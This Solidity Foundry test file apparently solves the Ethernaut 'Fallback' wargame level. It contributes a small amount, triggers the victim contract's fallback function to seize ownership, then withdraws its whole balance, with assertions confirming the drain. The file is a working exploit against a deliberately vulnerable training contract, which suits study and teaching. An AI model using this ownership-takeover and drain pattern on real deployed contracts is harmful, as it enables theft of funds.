// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackAttack is Test {
    Fallback public fallbackContract;
    address payable p1 =
        payable(address(0x35524A1a02D6C89C8FceAd21644cB61b032BD3DE));

    function setUp() public {
        fallbackContract = new Fallback();
    }

    /// @dev funds p1 with amount in ether
    function fund(uint256 _amount) public payable returns (bool) {
        bool sent = p1.send(_amount * 1 ether);
        require(sent, "funding tx did not work");
        require(p1.balance == 1 ether, "p1 does not have 1 eth");
        return sent;
    }

    /// @dev contributes a small amount of money to the victim
    function contribute() public payable {
        vm.prank(p1, p1);
        fallbackContract.contribute{value: 0.00001 ether}();
    }

    /// @dev sends a small amount of money to the contract, triggering the fallback function
    function triggerFallback() public payable returns (bool) {
        vm.prank(p1, p1);
        (bool triggeredFallback, bytes memory data) = address(fallbackContract)
            .call{value: 0.0001 ether}("");
        require(triggeredFallback, "Transaction fallback trigger error");
        return triggeredFallback;
    }

    /*
     * 1. Makes caller the owner
     * 2. Reduces balance of the contract to 0
     */
    function testAttack() public payable {
        // fund p1
        bool sent = fund(1);
        // contribute small amount of money
        contribute();
        // send random amount of money to victim, triggering fallback
        bool triggered = triggerFallback();
        // new owner should be p1
        assertEq(fallbackContract.owner(), p1);
        // withdraw all funds
        uint256 balBeforeP1 = address(p1).balance;
        uint256 balBeforeFallback = address(fallbackContract).balance;
        vm.prank(p1, p1);
        fallbackContract.withdraw();
        // balance in contract should now be zero
        assertEq(address(fallbackContract).balance, 0 ether);
        // balance of p1 should be balance before p1 + balance before fallback
        assertEq(address(p1).balance, balBeforeP1 + balBeforeFallback);
    }
}
